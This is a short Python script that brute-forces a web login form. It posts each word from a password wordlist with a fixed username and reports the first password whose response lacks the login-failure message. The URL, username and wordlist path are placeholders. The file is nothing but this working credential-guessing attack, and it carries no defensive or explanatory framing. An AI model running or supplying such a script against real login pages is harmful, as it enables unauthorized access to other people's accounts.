#!/usr/bin/env python
import requests

target_url = "https://..."
# data_dict = {"username": "blabla", "passwd": "134", "Login": "submit"}
# print(response.content) [When trying to check the html content]
data_dict = {"username": "valid username", "passwd": "", "Login": "submit"}

with open("path to passad.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["passwd"] = word
        response = requests.post(target_url, data=data_dict)
        if b"Login failure message" not in response.content:
            print("Passwd detected ->" + word)
            exit()
print("[+] No luck!!")
